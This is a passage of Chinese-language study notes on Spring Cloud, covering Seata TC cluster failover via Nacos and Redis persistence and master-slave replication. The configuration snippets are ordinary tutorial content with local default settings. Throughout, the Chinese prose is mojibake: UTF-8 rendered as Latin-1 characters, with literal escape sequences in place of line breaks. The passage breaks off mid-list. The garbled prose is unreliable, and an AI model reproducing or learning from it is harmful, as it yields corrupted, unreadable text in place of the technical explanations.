â¶é«˜å¯ç”¨æ¶æ„æ¨¡å‹\n\næ­å»ºTCæœåŠ¡é›†ç¾¤éå¸¸ç®€å•ï¼Œå¯åŠ¨å¤šä¸ªTCæœåŠ¡ï¼Œæ³¨å†Œåˆ°nacoså³å¯ã€‚ä½†é›†ç¾¤å¹¶ä¸èƒ½ç¡®ä¿100%å®‰å…¨ï¼Œä¸‡ä¸€é›†ç¾¤æ‰€åœ¨æœºæˆ¿æ•…éšœæ€ä¹ˆåŠï¼Ÿæ‰€ä»¥å¦‚æœè¦æ±‚è¾ƒé«˜ï¼Œä¸€èˆ¬éƒ½ä¼šåšå¼‚åœ°å¤šæœºæˆ¿å®¹ç¾ã€‚æ¯”å¦‚ä¸€ä¸ªTCé›†ç¾¤åœ¨ä¸Šæµ·ï¼Œå¦ä¸€ä¸ªTCé›†ç¾¤åœ¨æ­å·ï¼š\n\n![image-20221017141942983](../images/SpringCloud-é«˜çº§ç¯‡/image-20221017141942983.png)\n\n\n\nå¾®æœåŠ¡åŸºäºäº‹åŠ¡ç»„ï¼ˆtx-service-group)ä¸TCé›†ç¾¤çš„æ˜ å°„å…³ç³»ï¼Œæ¥æŸ¥æ‰¾å½“å‰åº”è¯¥ä½¿ç”¨å“ªä¸ªTCé›†ç¾¤ã€‚å½“SHé›†ç¾¤æ•…éšœæ—¶ï¼Œåªéœ€è¦å°†vgroup-mappingä¸­çš„æ˜ å°„å…³ç³»æ”¹æˆHZã€‚åˆ™æ‰€æœ‰å¾®æœåŠ¡å°±ä¼šåˆ‡æ¢åˆ°HZçš„TCé›†ç¾¤äº†ã€‚\n\n### â·TCæœåŠ¡çš„é«˜å¯ç”¨å’Œå¼‚åœ°å®¹ç¾\n\n#### 1.æ¨¡æ‹Ÿå¼‚åœ°å®¹ç¾çš„TCé›†ç¾¤\n\nè®¡åˆ’å¯åŠ¨ä¸¤å°seataçš„tcæœåŠ¡èŠ‚ç‚¹ï¼š\n\n| èŠ‚ç‚¹åç§° | ipåœ°å€    | ç«¯å£å· | é›†ç¾¤åç§° |\n| -------- | --------- | ------ | -------- |\n| seata    | 127.0.0.1 | 8091   | SH       |\n| seata2   | 127.0.0.1 | 8092   | HZ       |\n\nä¹‹å‰æˆ‘ä»¬å·²ç»å¯åŠ¨äº†ä¸€å°seataæœåŠ¡ï¼Œç«¯å£æ˜¯8091ï¼Œé›†ç¾¤åä¸ºSHã€‚ç°åœ¨ï¼Œå°†seataç›®å½•å¤åˆ¶ä¸€ä»½ï¼Œèµ·åä¸ºseata2\n\nä¿®æ”¹seata2/conf/registry.confå†…å®¹å¦‚ä¸‹ï¼š\n\n```nginx\nregistry {\n  # tcæœåŠ¡çš„æ³¨å†Œä¸­å¿ƒç±»ï¼Œè¿™é‡Œé€‰æ‹©nacosï¼Œä¹Ÿå¯ä»¥æ˜¯eurekaã€zookeeperç­‰\n  type = \"nacos\"\n\n  nacos {\n    # seata tc æœåŠ¡æ³¨å†Œåˆ° nacosçš„æœåŠ¡åç§°ï¼Œå¯ä»¥è‡ªå®šä¹‰\n    application = \"seata-tc-server\"\n    serverAddr = \"127.0.0.1:8848\"\n    group = \"DEFAULT_GROUP\"\n    namespace = \"\"\n    cluster = \"HZ\"\n    username = \"nacos\"\n    password = \"nacos\"\n  }\n}\n\nconfig {\n  # è¯»å–tcæœåŠ¡ç«¯çš„é…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼Œè¿™é‡Œæ˜¯ä»nacosé…ç½®ä¸­å¿ƒè¯»å–ï¼Œè¿™æ ·å¦‚æœtcæ˜¯é›†ç¾¤ï¼Œå¯ä»¥å…±äº«é…ç½®\n  type = \"nacos\"\n  # é…ç½®nacosåœ°å€ç­‰ä¿¡æ¯\n  nacos {\n    serverAddr = \"127.0.0.1:8848\"\n    namespace = \"\"\n    group = \"SEATA_GROUP\"\n    username = \"nacos\"\n    password = \"nacos\"\n    dataId = \"seataServer.properties\"\n  }\n}\n```\n\nè¿›å…¥seata2/binç›®å½•ï¼Œç„¶åè¿è¡Œå‘½ä»¤ï¼š\n\n```powershell\nseata-server.sh -p 8092\n```\n\næ‰“å¼€nacosæ§åˆ¶å°ï¼ŒæŸ¥çœ‹æœåŠ¡åˆ—è¡¨ï¼š\n\n![](../images/SpringCloud-é«˜çº§ç¯‡/image-20210624151150840.png)\n\nç‚¹è¿›è¯¦æƒ…æŸ¥çœ‹ï¼š\n\n![](../images/SpringCloud-é«˜çº§ç¯‡/image-20210624151221747.png)\n\n#### 2.å°†äº‹åŠ¡ç»„æ˜ å°„é…ç½®åˆ°nacos\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å°†tx-service-groupä¸clusterçš„æ˜ å°„å…³ç³»éƒ½é…ç½®åˆ°nacosé…ç½®ä¸­å¿ƒã€‚\n\næ–°å»ºä¸€ä¸ªé…ç½®ï¼š\n\n![](../images/SpringCloud-é«˜çº§ç¯‡/image-20210624151507072.png)\n\né…ç½®çš„å†…å®¹å¦‚ä¸‹ï¼š\n\n```properties\n# äº‹åŠ¡ç»„æ˜ å°„å…³ç³»\nservice.vgroupMapping.seata-demo=SH\n\nservice.enableDegrade=false\nservice.disableGlobalTransaction=false\n# ä¸TCæœåŠ¡çš„é€šä¿¡é…ç½®\ntransport.type=TCP\ntransport.server=NIO\ntransport.heartbeat=true\ntransport.enableClientBatchSendRequest=false\ntransport.threadFactory.bossThreadPrefix=NettyBoss\ntransport.threadFactory.workerThreadPrefix=NettyServerNIOWorker\ntransport.threadFactory.serverExecutorThreadPrefix=NettyServerBizHandler\ntransport.threadFactory.shareBossWorker=false\ntransport.threadFactory.clientSelectorThreadPrefix=NettyClientSelector\ntransport.threadFactory.clientSelectorThreadSize=1\ntransport.threadFactory.clientWorkerThreadPrefix=NettyClientWorkerThread\ntransport.threadFactory.bossThreadSize=1\ntransport.threadFactory.workerThreadSize=default\ntransport.shutdown.wait=3\n# RMé…ç½®\nclient.rm.asyncCommitBufferLimit=10000\nclient.rm.lock.retryInterval=10\nclient.rm.lock.retryTimes=30\nclient.rm.lock.retryPolicyBranchRollbackOnConflict=true\nclient.rm.reportRetryCount=5\nclient.rm.tableMetaCheckEnable=false\nclient.rm.tableMetaCheckerInterval=60000\nclient.rm.sqlParserType=druid\nclient.rm.reportSuccessEnable=false\nclient.rm.sagaBranchRegisterEnable=false\n# TMé…ç½®\nclient.tm.commitRetryCount=5\nclient.tm.rollbackRetryCount=5\nclient.tm.defaultGlobalTransactionTimeout=60000\nclient.tm.degradeCheck=false\nclient.tm.degradeCheckAllowTimes=10\nclient.tm.degradeCheckPeriod=2000\n\n# undoæ—¥å¿—é…ç½®\nclient.undo.dataValidation=true\nclient.undo.logSerialization=jackson\nclient.undo.onlyCareUpdateColumns=true\nclient.undo.logTable=undo_log\nclient.undo.compress.enable=true\nclient.undo.compress.type=zip\nclient.undo.compress.threshold=64k\nclient.log.exceptionRate=100\n```\n\n#### 3.å¾®æœåŠ¡è¯»å–nacosé…ç½®\n\næ¥ä¸‹æ¥ï¼Œéœ€è¦ä¿®æ”¹æ¯ä¸€ä¸ªå¾®æœåŠ¡çš„application.ymlæ–‡ä»¶ï¼Œè®©å¾®æœåŠ¡è¯»å–nacosä¸­çš„client.propertiesæ–‡ä»¶ï¼š\n\n```yaml\nseata:\n  config:\n    type: nacos\n    nacos:\n      server-addr: 127.0.0.1:8848\n      username: nacos\n      password: nacos\n      group: SEATA_GROUP\n      data-id: client.properties\n```\n\né‡å¯å¾®æœåŠ¡ï¼Œç°åœ¨å¾®æœåŠ¡åˆ°åº•æ˜¯è¿æ¥tcçš„SHé›†ç¾¤ï¼Œè¿˜æ˜¯tcçš„HZé›†ç¾¤ï¼Œéƒ½ç»Ÿä¸€ç”±nacosçš„client.propertiesæ¥å†³å®šäº†ã€‚\n\n# 3.åˆ†å¸ƒå¼ç¼“å­˜\n\n## â‘ RedisæŒä¹…åŒ–\n\n### â¶RDBæŒä¹…åŒ–\n\nRDBå…¨ç§°Redis Database Backup fileï¼ˆRedisæ•°æ®å¤‡ä»½æ–‡ä»¶ï¼‰ï¼Œä¹Ÿè¢«å«åšRedisæ•°æ®å¿«ç…§ã€‚ç®€å•æ¥è¯´å°±æ˜¯æŠŠå†…å­˜ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½è®°å½•åˆ°ç£ç›˜ä¸­ã€‚å½“Rediså®ä¾‹æ•…éšœé‡å¯åï¼Œä»ç£ç›˜è¯»å–å¿«ç…§æ–‡ä»¶ï¼Œæ¢å¤æ•°æ®ã€‚å¿«ç…§æ–‡ä»¶ç§°ä¸ºRDBæ–‡ä»¶ï¼Œé»˜è®¤æ˜¯ä¿å­˜åœ¨å½“å‰è¿è¡Œç›®å½•ã€‚\n\n#### 1.æ‰§è¡Œæ—¶æœº\n\nRDBæŒä¹…åŒ–åœ¨å››ç§æƒ…å†µä¸‹ä¼šæ‰§è¡Œï¼š\n\n- æ‰§è¡Œsaveå‘½ä»¤\n- æ‰§è¡Œbgsaveå‘½ä»¤\n- Redisåœæœºæ—¶\n- è§¦å‘RDBæ¡ä»¶æ—¶\n\n**1ï¼‰saveå‘½ä»¤**\n\næ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå¯ä»¥ç«‹å³æ‰§è¡Œä¸€æ¬¡RDBï¼š\n\n![](https://img.jwt1399.top/img/202210171526801.png)\n\nsaveå‘½ä»¤ä¼šå¯¼è‡´**ä¸»è¿›ç¨‹**æ‰§è¡ŒRDBï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­å…¶å®ƒæ‰€æœ‰å‘½ä»¤éƒ½ä¼šè¢«é˜»å¡ã€‚åªæœ‰åœ¨æ•°æ®è¿ç§»æ—¶å¯èƒ½ç”¨åˆ°ã€‚\n\n**2ï¼‰bgsaveå‘½ä»¤**\n\nä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¼‚æ­¥æ‰§è¡ŒRDBï¼š\n\n![](https://img.jwt1399.top/img/202210171527946.png)\n\nè¿™ä¸ªå‘½ä»¤æ‰§è¡Œåä¼šå¼€å¯**å­è¿›ç¨‹**å®ŒæˆRDBï¼Œä¸»è¿›ç¨‹å¯ä»¥æŒç»­å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œä¸å—å½±å“ã€‚\n\n**3ï¼‰åœæœºæ—¶**\n\nRedisåœæœºæ—¶ä¼šæ‰§è¡Œä¸€æ¬¡saveå‘½ä»¤ï¼Œå®ç°RDBæŒä¹…åŒ–ã€‚\n\n**4ï¼‰è§¦å‘RDBæ¡ä»¶**\n\nRediså†…éƒ¨æœ‰è§¦å‘RDBçš„æœºåˆ¶ï¼Œå¯ä»¥åœ¨redis.confæ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\n\n```properties\n# 900ç§’å†…ï¼Œå¦‚æœè‡³å°‘æœ‰1ä¸ªkeyè¢«ä¿®æ”¹ï¼Œåˆ™æ‰§è¡Œbgsave ï¼Œ å¦‚æœæ˜¯save \"\" åˆ™è¡¨ç¤ºç¦ç”¨RDB\nsave 900 1  \nsave 300 10  \nsave 60 10000 \n```\n\nRDBçš„å…¶å®ƒé…ç½®ä¹Ÿå¯ä»¥åœ¨redis.confæ–‡ä»¶ä¸­è®¾ç½®ï¼š\n\n```properties\n# æ˜¯å¦å‹ç¼© ,å»ºè®®ä¸å¼€å¯ï¼Œå‹ç¼©ä¹Ÿä¼šæ¶ˆè€—cpuï¼Œç£ç›˜çš„è¯ä¸å€¼é’±\nrdbcompression yes\n\n# RDBæ–‡ä»¶åç§°\ndbfilename dump.rdb  \n\n# æ–‡ä»¶ä¿å­˜çš„è·¯å¾„ç›®å½•\ndir ./ \n```\n\n#### 2.RDBåŸç†\n\nbgsaveå¼€å§‹æ—¶ä¼šforkä¸»è¿›ç¨‹å¾—åˆ°å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹å…±äº«ä¸»è¿›ç¨‹çš„å†…å­˜æ•°æ®ã€‚å®Œæˆforkåè¯»å–å†…å­˜æ•°æ®å¹¶å†™å…¥ RDB æ–‡ä»¶ã€‚forké‡‡ç”¨çš„æ˜¯copy-on-writeæŠ€æœ¯ï¼š\n\n- å½“ä¸»è¿›ç¨‹æ‰§è¡Œè¯»æ“ä½œæ—¶ï¼Œè®¿é—®å…±äº«å†…å­˜ï¼›\n- å½“ä¸»è¿›ç¨‹æ‰§è¡Œå†™æ“ä½œæ—¶ï¼Œåˆ™ä¼šæ‹·è´ä¸€ä»½æ•°æ®ï¼Œæ‰§è¡Œå†™æ“ä½œã€‚\n\n![](https://img.jwt1399.top/img/202210171530554.png)\n\n\n\n\n\n#### 3.å°ç»“\n\nRDBæ–¹å¼bgsaveçš„åŸºæœ¬æµç¨‹ï¼Ÿ\n\n- forkä¸»è¿›ç¨‹å¾—åˆ°ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå…±äº«å†…å­˜ç©ºé—´\n- å­è¿›ç¨‹è¯»å–å†…å­˜æ•°æ®å¹¶å†™å…¥æ–°çš„RDBæ–‡ä»¶\n- ç”¨æ–°RDBæ–‡ä»¶æ›¿æ¢æ—§çš„RDBæ–‡ä»¶\n\nRDBä¼šåœ¨ä»€ä¹ˆæ—¶å€™æ‰§è¡Œï¼Ÿsave 60 1000ä»£è¡¨ä»€ä¹ˆå«ä¹‰ï¼Ÿ\n\n- é»˜è®¤æ˜¯æœåŠ¡åœæ­¢æ—¶\n- ä»£è¡¨60ç§’å†…è‡³å°‘æ‰§è¡Œ1000æ¬¡ä¿®æ”¹åˆ™è§¦å‘RDB\n\nRDBçš„ç¼ºç‚¹ï¼Ÿ\n\n- RDBæ‰§è¡Œé—´éš”æ—¶é—´é•¿ï¼Œä¸¤æ¬¡RDBä¹‹é—´å†™å…¥æ•°æ®æœ‰ä¸¢å¤±çš„é£é™©\n- forkå­è¿›ç¨‹ã€å‹ç¼©ã€å†™å‡ºRDBæ–‡ä»¶éƒ½æ¯”è¾ƒè€—æ—¶\n\n### â·AOFæŒä¹…åŒ–\n\nAOFå…¨ç§°ä¸ºAppend Only Fileï¼ˆè¿½åŠ æ–‡ä»¶ï¼‰ã€‚Rediså¤„ç†çš„æ¯ä¸€ä¸ªå†™å‘½ä»¤éƒ½ä¼šè®°å½•åœ¨AOFæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åšæ˜¯å‘½ä»¤æ—¥å¿—æ–‡ä»¶ã€‚\n\n![](https://img.jwt1399.top/img/202210171534071.png)\n\n#### 1.AOFé…ç½®\n\nAOFé»˜è®¤æ˜¯å…³é—­çš„ï¼Œéœ€è¦ä¿®æ”¹redis.confé…ç½®æ–‡ä»¶æ¥å¼€å¯AOFï¼š\n\n```properties\n# æ˜¯å¦å¼€å¯AOFåŠŸèƒ½ï¼Œé»˜è®¤æ˜¯no\nappendonly yes\n# AOFæ–‡ä»¶çš„åç§°\nappendfilename \"appendonly.aof\"\n```\n\nAOFçš„å‘½ä»¤è®°å½•çš„é¢‘ç‡ä¹Ÿå¯ä»¥é€šè¿‡redis.confæ–‡ä»¶æ¥é…ï¼š\n\n```properties\n# è¡¨ç¤ºæ¯æ‰§è¡Œä¸€æ¬¡å†™å‘½ä»¤ï¼Œç«‹å³è®°å½•åˆ°AOFæ–‡ä»¶\nappendfsync always \n# å†™å‘½ä»¤æ‰§è¡Œå®Œå…ˆæ”¾å…¥AOFç¼“å†²åŒºï¼Œç„¶åè¡¨ç¤ºæ¯éš”1ç§’å°†ç¼“å†²åŒºæ•°æ®å†™åˆ°AOFæ–‡ä»¶ï¼Œæ˜¯é»˜è®¤æ–¹æ¡ˆ\nappendfsync everysec \n# å†™å‘½ä»¤æ‰§è¡Œå®Œå…ˆæ”¾å…¥AOFç¼“å†²åŒºï¼Œç”±æ“ä½œç³»ç»Ÿå†³å®šä½•æ—¶å°†ç¼“å†²åŒºå†…å®¹å†™å›ç£ç›˜\nappendfsync no\n```\n\nä¸‰ç§ç­–ç•¥å¯¹æ¯”ï¼š\n\n![](https://img.jwt1399.top/img/202210171535268.png)\n\n#### 2.AOFæ–‡ä»¶é‡å†™\n\nå› ä¸ºæ˜¯è®°å½•å‘½ä»¤ï¼ŒAOFæ–‡ä»¶ä¼šæ¯”RDBæ–‡ä»¶å¤§çš„å¤šã€‚è€Œä¸”AOFä¼šè®°å½•å¯¹åŒä¸€ä¸ªkeyçš„å¤šæ¬¡å†™æ“ä½œï¼Œä½†åªæœ‰æœ€åä¸€æ¬¡å†™æ“ä½œæ‰æœ‰æ„ä¹‰ã€‚é€šè¿‡æ‰§è¡Œbgrewriteaofå‘½ä»¤ï¼Œå¯ä»¥è®©AOFæ–‡ä»¶æ‰§è¡Œé‡å†™åŠŸèƒ½ï¼Œç”¨æœ€å°‘çš„å‘½ä»¤è¾¾åˆ°ç›¸åŒæ•ˆæœã€‚\n\n![](https://img.jwt1399.top/img/202210171537365.png)\n\nå¦‚å›¾ï¼ŒAOFåŸæœ¬æœ‰ä¸‰ä¸ªå‘½ä»¤ï¼Œä½†æ˜¯`set num 123 å’Œ set num 666`éƒ½æ˜¯å¯¹numçš„æ“ä½œï¼Œç¬¬äºŒæ¬¡ä¼šè¦†ç›–ç¬¬ä¸€æ¬¡çš„å€¼ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå‘½ä»¤è®°å½•ä¸‹æ¥æ²¡æœ‰æ„ä¹‰ã€‚æ‰€ä»¥é‡å†™å‘½ä»¤åï¼ŒAOFæ–‡ä»¶å†…å®¹å°±æ˜¯ï¼š`mset name jack num 666`\n\nRedisä¹Ÿä¼šåœ¨è§¦å‘é˜ˆå€¼æ—¶è‡ªåŠ¨å»é‡å†™AOFæ–‡ä»¶ã€‚é˜ˆå€¼ä¹Ÿå¯ä»¥åœ¨redis.confä¸­é…ç½®ï¼š\n\n```properties\n# AOFæ–‡ä»¶æ¯”ä¸Šæ¬¡æ–‡ä»¶ å¢é•¿è¶…è¿‡å¤šå°‘ç™¾åˆ†æ¯”åˆ™è§¦å‘é‡å†™\nauto-aof-rewrite-percentage 100\n# AOFæ–‡ä»¶ä½“ç§¯æœ€å°å¤šå¤§ä»¥ä¸Šæ‰è§¦å‘é‡å†™ \nauto-aof-rewrite-min-size 64mb \n```\n\n### â¸RDBä¸AOFå¯¹æ¯”\n\nRDBå’ŒAOFå„æœ‰è‡ªå·±çš„ä¼˜ç¼ºç‚¹ï¼Œå¦‚æœå¯¹æ•°æ®å®‰å…¨æ€§è¦æ±‚è¾ƒé«˜ï¼Œåœ¨å®é™…å¼€å‘ä¸­å¾€å¾€ä¼š**ç»“åˆ**ä¸¤è€…æ¥ä½¿ç”¨ã€‚\n\n![](https://img.jwt1399.top/img/202210171540950.png)\n\n## â‘¡Redisä¸»ä»\n\n### â¶ä¸»ä»åŒæ­¥åŸç†\n\n#### 1.å…¨é‡åŒæ­¥\n\nä¸»ä»ç¬¬ä¸€æ¬¡å»ºç«‹è¿æ¥æ—¶ï¼Œä¼šæ‰§è¡Œ**å…¨é‡åŒæ­¥**ï¼Œå°†masterèŠ‚ç‚¹çš„æ‰€æœ‰æ•°æ®éƒ½æ‹·è´ç»™slaveèŠ‚ç‚¹ï¼Œæµç¨‹ï¼š\n\n![](https://img.jwt1399.top/img/202210242159182.png)\n\nmasterå¦‚ä½•å¾—çŸ¥salveæ˜¯ç¬¬ä¸€æ¬¡æ¥è¿æ¥å‘¢ï¼Ÿï¼Ÿ\n\næœ‰å‡ ä¸ªæ¦‚å¿µï¼Œå¯ä»¥ä½œä¸ºåˆ¤æ–­ä¾æ®ï¼š\n\n- **Replication Id**ï¼šç®€ç§°replidï¼Œæ˜¯æ•°æ®é›†çš„æ ‡è®°ï¼Œidä¸€è‡´åˆ™è¯´æ˜æ˜¯åŒä¸€æ•°æ®é›†ã€‚æ¯ä¸€ä¸ªmasteréƒ½æœ‰å”¯ä¸€çš„replidï¼Œslaveåˆ™ä¼šç»§æ‰¿masterèŠ‚ç‚¹çš„replid\n- **offset**ï¼šåç§»é‡ï¼Œéšç€è®°å½•åœ¨repl_baklogä¸­çš„æ•°æ®å¢å¤šè€Œé€æ¸å¢å¤§ã€‚slaveå®ŒæˆåŒæ­¥æ—¶ä¹Ÿä¼šè®°å½•å½“å‰åŒæ­¥çš„offsetã€‚å¦‚æœslaveçš„offsetå°äºmasterçš„offsetï¼Œè¯´æ˜slaveæ•°æ®è½åäºmasterï¼Œéœ€è¦æ›´æ–°ã€‚\n\nå› æ­¤slaveåšæ•°æ®åŒæ­¥ï¼Œå¿…é¡»å‘masterå£°æ˜è‡ªå·±çš„replication id å’Œoffsetï¼Œmasteræ‰å¯ä»¥åˆ¤æ–­åˆ°åº•éœ€è¦åŒæ­¥å“ªäº›æ•°æ®ã€‚å› ä¸ºslaveåŸæœ¬ä¹Ÿæ˜¯ä¸€ä¸ªmasterï¼Œæœ‰è‡ªå·±çš„replidå’Œoffsetï¼Œå½“ç¬¬ä¸€æ¬¡å˜æˆslaveï¼Œä¸masterå»ºç«‹è¿æ¥æ—¶ï¼Œå‘é€çš„replidå’Œoffsetæ˜¯è‡ªå·±çš„replidå’Œoffsetã€‚\n\nmasteråˆ¤æ–­å‘ç°slaveå‘é€æ¥çš„replidä¸è‡ªå·±çš„ä¸ä¸€è‡´ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªå…¨æ–°çš„slaveï¼Œå°±çŸ¥é“è¦åšå…¨é‡åŒæ­¥äº†ã€‚\n\nmasterä¼šå°†è‡ªå·±çš„replidå’Œoffsetéƒ½å‘é€ç»™è¿™ä¸ªslaveï¼Œslaveä¿å­˜è¿™äº›ä¿¡æ¯ã€‚ä»¥åslaveçš„replidå°±ä¸masterä¸€è‡´äº†ã€‚\n\nå› æ­¤ï¼Œ**masteråˆ¤æ–­ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡åŒæ­¥çš„ä¾æ®ï¼Œå°±æ˜¯çœ‹replidæ˜¯å¦ä¸€è‡´**ã€‚æµç¨‹ï¼š\n\n![](https://img.jwt1399.top/img/202210242159471.png)\n\n#### 2.å¢é‡åŒæ­¥\n\nå…¨é‡åŒæ­¥éœ€è¦å…ˆåšRDBï¼Œç„¶åå°†RDBæ–‡ä»¶é€šè¿‡ç½‘ç»œä¼ è¾“ä¸ªslaveï¼Œæˆæœ¬å¤ªé«˜äº†ã€‚å› æ­¤é™¤äº†ç¬¬ä¸€æ¬¡åšå…¨é‡åŒæ­¥ï¼Œå…¶å®ƒå¤§å¤šæ•°æ—¶å€™slaveä¸masteréƒ½æ˜¯åš**å¢é‡åŒæ­¥**ã€‚å¢é‡åŒæ­¥å°±æ˜¯åªæ›´æ–°slaveä¸masterå­˜åœ¨å·®å¼‚çš„éƒ¨åˆ†æ•°æ®ã€‚æµç¨‹ï¼š\n\n![](https://img.jwt1399.top/img/202210242206846.png)\n\né‚£ä¹ˆmasteræ€ä¹ˆçŸ¥é“slaveä¸è‡ªå·±çš„æ•°æ®å·®å¼‚åœ¨å“ªé‡Œå‘¢?\n\n#### 3.repl_backlogåŸç†\n\n> masteræ€ä¹ˆçŸ¥é“slaveä¸è‡ªå·±çš„æ•°æ®å·®å¼‚åœ¨å“ªé‡Œå‘¢ï¼Ÿè¿™å°±è¦è¯´åˆ°å…¨é‡åŒæ­¥æ—¶çš„repl_baklogæ–‡ä»¶äº†ã€‚\n\nè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå›ºå®šå¤§å°çš„**ç¯å½¢æ•°ç»„**ï¼Œä¹Ÿå°±æ˜¯è¯´**è§’æ ‡åˆ°è¾¾æ•°ç»„æœ«å°¾åï¼Œä¼šå†æ¬¡ä»0å¼€å§‹è¯»å†™**ï¼Œè¿™æ ·æ•°ç»„å¤´éƒ¨çš„æ•°æ®å°±ä¼šè¢«è¦†ç›–ã€‚repl_baklogä¸­ä¼šè®°å½•Rediså¤„ç†è¿‡çš„å‘½ä»¤æ—¥å¿—åŠoffsetï¼ŒåŒ…æ‹¬masterå½“å‰çš„offsetï¼Œå’Œslaveå·²ç»æ‹·è´åˆ°çš„offsetã€‚\n\nâ€slaveä¸masterçš„offsetä¹‹é—´çš„å·®å¼‚ï¼Œå°±æ˜¯salveéœ€è¦å¢é‡æ‹·è´çš„æ•°æ®äº†(å³å›¾ä¸­çº¢è‰²éƒ¨åˆ†)ã€‚\n\nâéšç€ä¸æ–­æœ‰æ•°æ®å†™å…¥ï¼Œmasterçš„offseté€æ¸å˜å¤§ï¼Œslaveä¹Ÿä¸æ–­çš„æ‹·è´ï¼Œè¿½èµ¶masterçš„offset\n\nâ‚ç›´åˆ°æ•°ç»„è¢«å¡«æ»¡ï¼Œæ­¤æ—¶ï¼Œå¦‚æœæœ‰æ–°çš„æ•°æ®å†™å…¥ï¼Œå°±ä¼šè¦†ç›–æ•°ç»„ä¸­çš„æ—§æ•°æ®ã€‚ä¸è¿‡ï¼Œæ—§çš„æ•°æ®åªè¦æ˜¯ç»¿è‰²çš„ï¼Œè¯´æ˜æ˜¯å·²ç»è¢«åŒæ­¥åˆ°slaveçš„æ•°æ®ï¼Œå³ä¾¿è¢«è¦†ç›–äº†ä¹Ÿæ²¡ä»€ä¹ˆå½±å“ã€‚å› ä¸ºæœªåŒæ­¥çš„æ˜¯çº¢è‰²éƒ¨åˆ†ã€‚\n\nâƒä½†æ˜¯ï¼Œå¦‚æœslaveå‡ºç°ç½‘ç»œé˜»å¡ï¼Œå¯¼è‡´masterçš„offsetè¿œè¿œè¶…è¿‡äº†slaveçš„offsetï¼Œå¦‚æœmasterç»§ç»­å†™å…¥æ–°æ•°æ®ï¼Œå…¶offsetå°±ä¼šè¦†ç›–æ—§çš„æ•°æ®ï¼Œç›´åˆ°å°†slaveç°åœ¨çš„offsetä¹Ÿè¦†ç›–\n\nâ„æ£•è‰²æ¡†ä¸­çš„çº¢è‰²éƒ¨åˆ†ï¼Œå°±æ˜¯å°šæœªåŒæ­¥ï¼Œä½†æ˜¯å´å·²ç»è¢«è¦†ç›–çš„æ•°æ®ã€‚æ­¤æ—¶å¦‚æœslaveæ¢å¤ï¼Œéœ€è¦åŒæ­¥ï¼Œå´å‘ç°è‡ªå·±çš„offsetéƒ½æ²¡æœ‰äº†ï¼Œæ— æ³•å®Œæˆå¢é‡åŒæ­¥äº†ã€‚åªèƒ½åšå…¨é‡åŒæ­¥ã€‚\n\n| â€                                                    | â                                                    | â‚                                                    | âƒ                                                    | â„                                                    |\n| ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210242220885.png) | ![](https://img.jwt1399.top/img/202210242220139.png) | ![](https://img.jwt1399.top/img/202210242220579.png) | ![](https://img.jwt1399.top/img/202210242220746.png) | ![](https://img.jwt1399.top/img/202210242220273.png) |\n\næ€»ç»“ï¼šrepl_baklogå¤§å°æœ‰ä¸Šé™ï¼Œå†™æ»¡åä¼šè¦†ç›–æœ€æ—©çš„æ•°æ®ã€‚å¦‚æœslaveæ–­å¼€æ—¶é—´è¿‡ä¹…ï¼Œå¯¼è‡´å°šæœªå¤‡ä»½çš„æ•°æ®è¢«è¦†ç›–ï¼Œåˆ™æ— æ³•åŸºäº1ogåšå¢é‡åŒæ­¥ï¼Œåªèƒ½å†æ¬¡å…¨é‡åŒæ­¥ã€‚\n\n### â·ä¸»ä»åŒæ­¥ä¼˜åŒ–\n\nä¸»ä»åŒæ­¥å¯ä»¥ä¿è¯ä¸»ä»æ•°æ®çš„ä¸€è‡´æ€§ï¼Œå¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢æ¥ä¼˜åŒ–Redisä¸»ä»é›†ç¾¤ï¼š\n\n- åœ¨masterä¸­é…ç½®`repl-diskless-sync yes`å¯ç”¨æ— ç£ç›˜å¤åˆ¶ï¼Œé¿å…å…¨é‡åŒæ­¥æ—¶çš„ç£ç›˜IOã€‚\n- Rediså•èŠ‚ç‚¹ä¸Šçš„å†…å­˜å ç”¨ä¸è¦å¤ªå¤§ï¼Œå‡å°‘RDBå¯¼è‡´çš„è¿‡å¤šç£ç›˜IO\n- é€‚å½“æé«˜repl_baklogçš„å¤§å°ï¼Œå‘ç°slaveå®•æœºæ—¶å°½å¿«å®ç°æ•…éšœæ¢å¤ï¼Œå°½å¯èƒ½é¿å…å…¨é‡åŒæ­¥\n- é™åˆ¶ä¸€ä¸ªmasterä¸Šçš„slaveèŠ‚ç‚¹æ•°é‡ï¼Œå¦‚æœå®åœ¨æ˜¯å¤ªå¤šslaveï¼Œåˆ™å¯ä»¥é‡‡ç”¨ä¸»-ä»-ä»é“¾å¼ç»“æ„ï¼Œå‡å°‘masterå‹åŠ›\n\nä¸»ä»ä»æ¶æ„å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202210242223210.png)\n\n### â¸æ€»ç»“\n\nç®€è¿°å…¨é‡åŒæ­¥å’Œå¢é‡åŒæ­¥åŒºåˆ«ï¼Ÿ\n\n- å…¨é‡åŒæ­¥ï¼šmasterå°†å®Œæ•´å†…å­˜æ•°æ®ç”ŸæˆRDBï¼Œå‘é€RDBåˆ°slaveã€‚åç»­å‘½ä»¤åˆ™è®°å½•åœ¨repl_baklogï¼Œé€ä¸ªå‘é€ç»™slaveã€‚\n- å¢é‡åŒæ­¥ï¼šslaveæäº¤è‡ªå·±çš„offsetåˆ°masterï¼Œmasterè·å–repl_baklogä¸­ä»offsetä¹‹åçš„å‘½ä»¤ç»™slave\n\nä»€ä¹ˆæ—¶å€™æ‰§è¡Œå…¨é‡åŒæ­¥ï¼Ÿ\n\n- 